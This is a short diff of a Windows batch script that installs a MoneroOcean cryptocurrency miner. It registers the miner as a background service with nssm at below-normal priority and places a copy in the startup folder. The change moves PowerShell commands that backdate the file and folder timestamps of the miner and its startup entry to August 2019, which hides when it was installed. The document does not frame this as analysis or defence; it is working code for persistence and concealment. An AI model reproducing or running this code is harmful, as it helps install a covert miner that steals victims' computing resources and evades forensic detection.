@@ -368,11 +368,6 @@ echo "%USERPROFILE%\moneroocean\miner.bat" --config="%USERPROFILE%\moneroocean\c
 echo [*] Running miner in the background
 
 
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').LastWriteTime=('3 August 2019 17:00:00')"
-
-powershell -Command "(Get-Item '%STARTUP_DIR%\moneroocean_miner.bat').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%STARTUP_DIR%\moneroocean_miner.bat').LastWriteTime=('3 August 2019 17:00:00')"
 
 
 
@@ -420,6 +415,14 @@ if errorlevel 1 (
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\moneroocean\stdout"
 "%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\moneroocean\stderr"
+
+
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\miner.bat').LastWriteTime=('3 August 2019 17:00:00')"
+
+powershell -Command "(Get-Item '%STARTUP_DIR%\moneroocean_miner.bat').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%STARTUP_DIR%\moneroocean_miner.bat').LastWriteTime=('3 August 2019 17:00:00')"
+
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').CreationTime=('3 August 2019 17:00:00')"
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').LastWriteTime=('3 August 2019 17:00:00')"
